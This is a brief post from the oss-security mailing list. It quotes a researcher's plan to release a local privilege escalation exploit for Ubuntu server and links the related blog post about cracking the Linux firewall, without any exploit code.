> > ----- Forwarded message from Hugues ANGUELKOV <hanguelkov@...dorisec.fr> -----

> > Also, we would like to release the LPE exploit targeting Ubuntu server
> > along with a more detailed blogpost.

Apparently, this is the blog post:

<https://www.randorisec.fr/crack-linux-firewall/>

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


